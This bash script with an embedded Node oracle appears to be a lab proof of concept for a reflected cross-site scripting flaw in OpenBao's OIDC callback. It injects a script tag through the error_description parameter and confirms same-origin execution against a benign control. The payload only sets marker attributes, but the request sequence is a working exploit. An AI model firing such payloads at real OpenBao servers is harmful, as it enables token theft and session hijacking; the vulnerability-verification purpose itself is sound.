#!/usr/bin/env bash
set -euo pipefail

base_url="${OPENBAO_URL:-http://127.0.0.1:8200}"
script_dir="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
attempt_dir="$(CDPATH= cd -- "$script_dir/.." && pwd)"
evidence_root="$attempt_dir/evidence"
run_id="$(date -u +%Y%m%dT%H%M%SZ)_$$"
run_dir="$evidence_root/$run_id"
mkdir -p "$run_dir"

die() {
  printf 'FAIL: %s\n' "$*" >&2
  printf '%s\n' "FAIL: $*" > "$run_dir/result.txt"
  exit 1
}

command -v curl >/dev/null 2>&1 || die "curl is required"
command -v jq >/dev/null 2>&1 || die "jq is required"
if [ -x /opt/node/bin/node ]; then
  node_bin=/opt/node/bin/node
elif command -v node >/dev/null 2>&1; then
  node_bin="$(command -v node)"
else
  die "node is required for the browser-execution oracle"
fi
"$node_bin" -e "require('jsdom')" >/dev/null 2>&1 || die "jsdom is required for the browser-execution oracle"

health_headers="$run_dir/health.response.headers"
health_body="$run_dir/health.response.body"
if ! curl -sS -D "$health_headers" -o "$health_body" "$base_url/v1/sys/health"; then
  die "OpenBao health endpoint is unavailable"
fi
health_status="$(awk 'NR == 1 {print $2}' "$health_headers")"
[ "$health_status" = 200 ] || die "unexpected health status: ${health_status:-missing}"

auth_endpoint="$base_url/v1/auth/oidc/oidc/auth_url"
callback_endpoint="$base_url/v1/auth/oidc/oidc/callback"
redirect_uri="$base_url/ui/vault/auth/oidc/oidc/callback"
active_marker="OPENBAO_OIDC_ACTIVE_${run_id}"
control_marker="OPENBAO_OIDC_CONTROL_${run_id}"

get_fresh_state() {
  local label="$1"
  local client_nonce="$2"
  local request_file="$run_dir/$label.auth_url.request.txt"
  local trace_file="$run_dir/$label.auth_url.trace"
  local headers_file="$run_dir/$label.auth_url.response.headers"
  local body_file="$run_dir/$label.auth_url.response.body"
  local response status

  cat > "$request_file" <<EOF
POST $auth_endpoint
role=lab-direct
redirect_uri=$redirect_uri
client_nonce=$client_nonce
EOF
  if ! curl -sS --trace-ascii "$trace_file" -D "$headers_file" -o "$body_file" \
      -X POST "$auth_endpoint" \
      --data-urlencode 'role=lab-direct' \
      --data-urlencode "redirect_uri=$redirect_uri" \
      --data-urlencode "client_nonce=$client_nonce"; then
    die "$label auth_url request failed"
  fi
  status="$(awk 'NR == 1 {print $2}' "$headers_file")"
  [ "$status" = 200 ] || die "$label auth_url returned ${status:-missing}, expected 200"
  response="$(jq -er '.data.state | select(type == "string" and length > 0)' "$body_file")" \
    || die "$label auth_url response did not contain a fresh state"
  printf '%s\n' "$response"
}

run_callback() {
  local label="$1"
  local state="$2"
  local failure="$3"
  local request_file="$run_dir/$label.callback.request.txt"
  local trace_file="$run_dir/$label.callback.trace"
  local headers_file="$run_dir/$label.callback.response.headers"
  local body_file="$run_dir/$label.callback.response.body"
  local status

  cat > "$request_file" <<EOF
GET $callback_endpoint
state=$state
error_description=$failure
EOF
  if ! curl -sS --trace-ascii "$trace_file" -D "$headers_file" -o "$body_file" \
      --get "$callback_endpoint" \
      --data-urlencode "state=$state" \
      --data-urlencode "error_description=$failure"; then
    die "$label callback request failed"
  fi
  status="$(awk 'NR == 1 {print $2}' "$headers_file")"
  [ "$status" = 400 ] || die "$label callback returned ${status:-missing}, expected 400"
  grep -Eiq '^Content-Type:[[:space:]]*text/html([;[:space:]]|$)' "$headers_file" \
    || die "$label callback did not return text/html"
}

active_state="$(get_fresh_state active "${run_id}_active_nonce")"
control_state="$(get_fresh_state control "${run_id}_control_nonce")"

active_payload="</p><script>document.title='${active_marker}';document.documentElement.setAttribute('data-poc-marker','${active_marker}');document.documentElement.setAttribute('data-poc-origin',location.origin)</script><p>"
control_payload="$control_marker"
run_callback active "$active_state" "$active_payload"
run_callback control "$control_state" "$control_payload"

grep -Fq "$active_marker" "$run_dir/active.callback.response.body" \
  || die "active marker was not reflected in the callback response"
grep -Fq '<script>' "$run_dir/active.callback.response.body" \
  || die "active script tag was not preserved in the callback response"
grep -Fq "$control_marker" "$run_dir/control.callback.response.body" \
  || die "control marker was not reflected in the callback response"
if grep -Fq '<script>' "$run_dir/control.callback.response.body"; then
  die "control response unexpectedly contained a script tag"
fi

oracle_file="$run_dir/browser-execution.oracle.json"
if ! ACTIVE_BODY="$run_dir/active.callback.response.body" \
    CONTROL_BODY="$run_dir/control.callback.response.body" \
    ACTIVE_MARKER="$active_marker" CONTROL_MARKER="$control_marker" \
    EXPECTED_ORIGIN="$base_url" ORACLE_FILE="$oracle_file" \
    "$node_bin" - <<'NODE'
const fs = require('fs');
const {JSDOM, VirtualConsole} = require('jsdom');

const activeHtml = fs.readFileSync(process.env.ACTIVE_BODY, 'utf8');
const controlHtml = fs.readFileSync(process.env.CONTROL_BODY, 'utf8');
const expectedOrigin = process.env.EXPECTED_ORIGIN;
const activeMarker = process.env.ACTIVE_MARKER;
const controlMarker = process.env.CONTROL_MARKER;

function inspect(html) {
  const errors = [];
  const console = new VirtualConsole();
  console.on('jsdomError', error => errors.push(String(error)));
  const dom = new JSDOM(html, {
    url: `${expectedOrigin}/v1/auth/oidc/oidc/callback`,
    runScripts: 'dangerously',
    virtualConsole: console,
  });
  const result = {
    title: dom.window.document.title,
    marker: dom.window.document.documentElement.getAttribute('data-poc-marker'),
    origin: dom.window.document.documentElement.getAttribute('data-poc-origin'),
    scriptCount: dom.window.document.scripts.length,
    errors,
  };
  dom.window.close();
  return result;
}

const observed = {active: inspect(activeHtml), control: inspect(controlHtml)};
fs.writeFileSync(process.env.ORACLE_FILE, JSON.stringify(observed, null, 2) + '\n');

const activeOk = observed.active.title === activeMarker &&
  observed.active.marker === activeMarker &&
  observed.active.origin === expectedOrigin &&
  observed.active.scriptCount >= 1 && observed.active.errors.length === 0;
const controlOk = observed.control.title !== controlMarker &&
  observed.control.marker === null && observed.control.scriptCount === 0;
if (!activeOk || !controlOk) process.exit(1);
NODE
then
  die "browser execution oracle did not distinguish active content from the benign control"
fi

cat > "$run_dir/result.txt" <<EOF
PASS
active_state=$active_state
control_state=$control_state
active_marker=$active_marker
control_marker=$control_marker
oracle=$oracle_file
EOF
printf 'PASS: active same-origin script execution observed; evidence: %s\n' "$run_dir"
